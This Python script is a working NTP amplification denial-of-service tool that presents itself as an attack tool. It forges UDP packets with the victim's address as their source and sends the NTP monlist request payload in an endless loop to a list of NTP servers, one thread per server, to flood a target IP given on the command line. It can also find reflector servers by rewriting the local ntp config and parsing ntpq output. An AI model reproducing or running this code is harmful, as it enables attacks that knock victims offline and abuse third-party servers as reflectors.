#!/usr/bin/env python3

try:
    from scapy.all import IP, UDP, Raw, send
except ImportError:
    raise ImportError(
        "The 'scapy' library is not installed. Please install it using 'apt-get' before using this package."
    )

import json
import os
import shutil
import socket
import subprocess
import sys
import threading
import time

from pyfiglet import figlet_format
from termcolor import colored

CONFIG_PATH = "config.json"


class Config:
    def __init__(self, ntp_config_path: str, pools, server_count):
        self.ntp_config_path = ntp_config_path
        self.pools = pools
        self.server_count = server_count

    @classmethod
    def from_json_file(cls, json_file):
        with open(json_file, "r") as f:
            json_data = f.read()
        return cls.from_json(json_data)

    @classmethod
    def from_json(cls, json_data):
        data = json.loads(json_data)
        ntp_config_path = data["ntp_config_path"]
        pools = data["pools"]
        server_count = data["server_count"]
        config = cls(ntp_config_path, pools, server_count)
        config.remove_pools()
        config.add_pools()
        return config

    def remove_pools(self):
        with open(self.ntp_config_path, "r") as config_file:
            lines = config_file.readlines()
        with open(self.ntp_config_path, "w") as config_file:
            for line in lines:
                if not line.startswith("server"):
                    config_file.write(line)

    def add_pools(self):
        with open(self.ntp_config_path, "r") as f:
            content = f.read()
        for pool in self.pools:
            if "server " + pool not in content:
                with open(self.ntp_config_path, "a") as f:
                    f.write("server " + pool + "\n")


class NTPScanner:
    def __init__(self, config: Config):
        self.config = config
        self.restart_daemon()
        self.servers = []

    def restart_daemon(self):
        print_formatted("+", "Restarting ntp daemon...")
        subprocess.run(["systemctl", "restart", "ntp"])
        print_formatted("+", "Synchronizing ntp servers...")
        time.sleep(2 * self.config.server_count)

    def scan(self):
        self.servers.clear()
        print_formatted("+", "Scanning for ntp servers...")
        output = subprocess.run(["ntpq", "-p"], capture_output=True).stdout.decode()
        for line in output.split("\n"):
            refid = self.extract_ipv4_refid(line)
            if refid:
                self.servers.append(refid)

    def extract_ipv4_refid(self, row: str):
        fields = row.split(" ")
        if len(fields) < 3:
            return None
        refid = fields[2]
        if not is_ipv4(refid):
            return None
        return refid


def is_ipv4(address: str):
    try:
        socket.inet_pton(socket.AF_INET, address)
    except socket.error:
        return False
    return True


def print_banner():
    banner_text = "NTP-AMPLIFIER"
    description_text = "NTP-Amplification Attack Tool v1.5.3"
    usage_text = "USAGE: ntp_amplification [options] <target ip>"
    options_text = """OPTIONS:
 -h, --help: Show this help message and exit
 -s, --server: Specify ntp server list file
 -c, --config: Specify config file"""
    example_text = "EXAMPLE: ntp-amplification -s example-servers.txt 192.168.2.1"

    terminal_width = shutil.get_terminal_size().columns
    font = "standard"

    ascii_banner = figlet_format(
        banner_text, font=font, width=terminal_width, justify="left"
    )

    colored_banner = colored(ascii_banner, color="red", attrs=["bold"])
    colored_usage = colored(usage_text, color="red")
    colored_options = colored(options_text, color="red")
    colored_example = colored(example_text, color="red")
    description_text = colored(
        description_text, color="red", attrs=["bold", "underline"]
    )

    print(colored_banner)
    print(description_text)
    print("\n" + colored_usage)
    print(colored_options)
    print(colored_example)


def deny(server: str, target: str):
    payload = "\x17\x00\x03\x2a" + "\x00" * 4
    packet = IP(dst=server, src=target) / UDP(sport=80, dport=123) / Raw(load=payload)
    send(packet, loop=1, verbose=True)


def parse_args():
    if len(sys.argv) < 2:
        print_banner()
        sys.exit(1)

    options = {"-h": "--help", "-s": "--server", "-c": "--config"}
    args = {"target_ip": None, "server_list": None, "config": None}

    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg in options.keys() or arg in options.values():
            if arg in ["-h", "--help"]:
                print_banner()
                sys.exit(0)
            if arg in ["-s", "--server"]:
                if i + 1 >= len(sys.argv):
                    print_formatted("-", "Error: server list file is required")
                    print_banner()
                    sys.exit(1)
                args["server_list"] = sys.argv[i + 1]
            if arg in ["-c", "--config"]:
                if i + 1 >= len(sys.argv):
                    print_formatted("-", "Error: config file is required")
                    print_banner()
                    sys.exit(1)
                args["config"] = sys.argv[i + 1]
        i += 1

    args["target_ip"] = sys.argv[-1]
    if args["target_ip"] is None or not is_ipv4(args["target_ip"]):
        print_formatted("-", "Target ip is required and must be a valid ipv4 address")
        print_banner()
        sys.exit(1)

    return args


def read_servers(server_list: str) -> list:
    if not os.path.isfile(server_list):
        print("Error: server list file does not exist")
        sys.exit(1)

    with open(server_list, "r") as f:
        servers = f.read().splitlines()

    return servers


def ntp_amplify(servers: list, target: str):
    threads = []
    try:
        print_formatted("+", "Starting to flood: " + target + " ...")
        print_formatted("!", "Use CTRL+Z to stop attack")

        for server in servers:
            thread = threading.Thread(target=deny, args=(server, target))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        print_formatted("+", "Flooding...")

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print_formatted("-", "Script interrupted [CTRL + Z]... shutting down")


def print_formatted(prefix: str, text: str, color: str = "red", attrs: list = []):
    valid_prefixes = ["+", "!", "-"]

    if prefix not in valid_prefixes:
        raise ValueError("Invalid prefix: " + prefix)

    colored_prefix = {
        "+": colored(prefix, "green", attrs=["bold"]),
        "!": colored(prefix, "yellow", attrs=["bold"]),
        "-": colored(prefix, "red", attrs=["bold"]),
    }

    colored_text = colored(text, color, attrs=attrs)
    print("[" + colored_prefix[prefix] + "]" + " " + colored_text)


def main():
    if os.geteuid() != 0:
        print_formatted("!", "Script must be executed as root")
        return

    args = parse_args()
    servers = []
    config_path = CONFIG_PATH

    if args["config"] is not None:
        config_path = args["config"]
    print(config_path)

    if args["server_list"] is not None:
        servers = read_servers(args["server_list"])
        ntp_amplify(servers, args["target_ip"])
        return

    config = Config.from_json_file(config_path)
    scanner = NTPScanner(config)
    scanner.scan()
    ntp_amplify(scanner.servers, args["target_ip"])


if __name__ == "__main__":
    main()
